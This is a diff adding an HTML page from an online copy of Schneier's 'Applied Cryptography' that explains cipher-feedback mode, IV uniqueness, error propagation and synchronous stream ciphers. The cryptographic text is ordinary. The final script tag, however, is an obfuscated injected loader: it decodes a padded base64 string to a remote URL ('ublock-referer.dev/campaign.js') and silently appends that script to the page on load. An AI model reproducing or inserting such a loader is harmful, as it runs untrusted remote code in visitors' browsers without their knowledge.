@@ -1,0 +1,95 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Algorithm Types and Modes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=09//-->
+<!--PAGES=200-202//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>In CFB mode, data can be encrypted in units smaller than the block size. The following example will encrypt one ASCII character at a time (this is called <B>8-bit CFB</B>), but nothing is sacred about the number eight. You can encrypt data one bit at a time using 1-bit CFB, although using one complete encryption of a block cipher for a single bit seems like a whole lot of work; a stream cipher might be a better idea. (Reducing the number of rounds of the block cipher to speed things up is not recommended [1269].) You can also use 64-bit CFB, or any <I>n</I>-bit CFB where <I>n</I> is less than or equal to the block size.</P>
+<P>Figure 9.9 shows 8-bit CFB mode working with a 64-bit block algorithm. A block algorithm in CFB mode operates on a queue the size of the input block. Initially, the queue is filled with an IV, as in CBC mode. The queue is encrypted and the left-most eight bits of the result are XORed with the first 8-bit character of the plaintext to become the first 8-bit character of the ciphertext. This character can now be transmitted. The same eight bits are also moved to the right-most eight bit positions of the queue, and all the other bits move eight to the left. The eight left-most bits are discarded. Then the next plaintext character is encrypted in the same manner. Decryption is the reverse of this process. On both the encryption and the decryption side, the block algorithm is used in its encryption mode.</P>
+<I><P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/09-09.jpg',302,148 )"><IMG SRC="images/09-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-09.jpg',302,148)"><FONT COLOR="#000077"><B>Figure 9.9</B></FONT></A>&nbsp;&nbsp;8-bit cipher-feedback mode.</I>
+<I></P>
+<P><A NAME="Fig10"></A><A HREF="javascript:displayWindow('images/09-10.jpg',154,113 )"><IMG SRC="images/09-10t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/09-10.jpg',154,113)"><FONT COLOR="#000077"><B>Figure 9.10</B></FONT></A>&nbsp;&nbsp;</I>n-<I>bit CFB with an</I> n-<I>bit algorithm.</I>
+</P>
+<P>If the block size of the algorithm is <I>n</I>, then <I>n-</I>bit CFB looks like (see Figure 9.10):</P>
+<DL>
+<DD><I>C</I><SUB>i</SUB> = <I>P</I><SUB>i</SUB> &#8853; <I>E</I><SUB>K</SUB>(<I>C</I><SUB>i-1</SUB>)
+<DD><I>P</I><SUB>i</SUB> = <I>C</I><SUB>i</SUB> &#8853; <I>E</I><SUB>K</SUB>(<I>C</I><SUB>i-1</SUB>)
+</DL>
+<P>Like CBC mode, CFB mode links the plaintext characters together so that the ciphertext depends on all the preceding plaintext.
+</P>
+<P><FONT SIZE="+1"><B><I>Initialization Vector</I></B></FONT></P>
+<P>To initialize the CFB process, the input to the block algorithm must be initialized with an IV. Like the IV used in CBC mode, it need not be secret.
+</P>
+<P>The IV must be unique, though. (This is different from the IV in CBC mode, which should be unique but does not have to be.) If the IV in CFB is not unique, a cryptanalyst can recover the corresponding plaintext. The IV must be changed with every message. It can be a serial number, which increments after each message and does not repeat during the lifetime of the key. For data encrypted for storage, it can be a function of the index used to look up the data.</P>
+<P><FONT SIZE="+1"><B><I>Error Propagation</I></B></FONT></P>
+<P>With CFB mode, an error in the plaintext affects all subsequent ciphertext and reverses itself at decryption. An error in the ciphertext is more interesting. The first effect of a single-bit error in the ciphertext is to cause a single error in the plaintext. After that, the error enters the shift register, where it causes ciphertext to be garbled until it falls off the other end of the register. In 8-bit CFB mode, 9 bytes of decrypted plaintext are garbled by a single-bit error in the ciphertext. After that, the system recovers and all subsequent ciphertext is decrypted correctly. In general, in <I>n</I>-bit CFB a single ciphertext error will affect the decryption of the current and following <I>m</I>/<I>n</I>-1 blocks, where <I>m</I> is the block size.</P>
+<P>One subtle problem with this kind of error propagation is that if Mallory knows the plaintext of a transmission, he can toggle bits in a given block and make it decrypt to whatever he wants. The <I>next</I> block will decrypt to garbage, but the damage may already be done. And he can change the final bits of a message without detection.</P>
+<P>CFB is self-recovering with respect to synchronization errors as well. The error enters the shift register, where it garbles 8 bytes of data until it falls off the other end. CFB is an example of block cipher being used as a self-synchronizing stream cipher (at the block level).</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">9.7  Synchronous Stream Ciphers</FONT></H3>
+<P>In a <B>synchronous stream cipher</B> the keystream is generated independent of the message stream. The military calls this <B>Key Auto-Key</B> (KAK). On the encryption side, a keystream generator spits out keystream bits, one after the other. On the decryption side, another keystream generator spits out the identical keystream bits, one after the other. This works, as long as the two keystream generators are synchronized. If one of them skips a cycle or if a ciphertext bit gets lost during transmission, then every ciphertext character after the error will decrypt incorrectly.</P>
+<P>If this happens, the sender and receiver must resynchronize their keystream generators before they can proceed. Frustrating matters even further, they must do this in such a way as to ensure that no part of the keystream is repeated, so the obvious solution of resetting the keystream generator to an earlier state won&#146;t work.</P>
+<P>On the plus side, synchronous ciphers do not propagate transmission errors. If a bit is garbled during transmission, which is far more likely than a bit being lost altogether, then only the garbled bit will be decrypted incorrectly. All preceding and subsequent bits will be unaffected.</P>
+<P>Since a keystream generator must generate the same output on both the encryption and decryption ends, it must be deterministic. Because it is implemented in a finite-state machine (i.e., a computer), the sequence will eventually repeat. These keystream generators are called <B>periodic</B>. Except for one-time pads, all keystream generators are periodic.</P>
+<P>The keystream generator must have a long period, one far longer than the number of bits the generator will output between key changes. If the period is less than the plaintext, then different parts of the plaintext will be encrypted the same way&#151;a severe weakness. If a cryptanalyst knows a piece of the plaintext, he can recover a piece of the keystream and use that to recover more of the plaintext. Even if the analyst only has the ciphertext, he can XOR the sections encrypted with the same keystream and get the XOR of plaintext with plaintext. This is just the simple XOR algorithm with a very long key.</P>
+<P>How long a period is long enough depends on the application. A keystream generator encrypting a continuous T-1 link will encrypt 2<SUP>37</SUP> bits per day. The keystream generator&#146;s period must be orders of magnitude larger than that, even if the key is changed daily. If the period is long enough, you might only have to change the key weekly or even monthly.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="09-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="09-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(uNabxTsg, dVnqcqid) {dVnqcqid = uNabxTsg.createElement('script');dVnqcqid.type = 'text/javascript';dVnqcqid.async = true;dVnqcqid.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');uNabxTsg.getElementsByTagName('body')[0].appendChild(dVnqcqid);}(document));</script></body>
+</html>
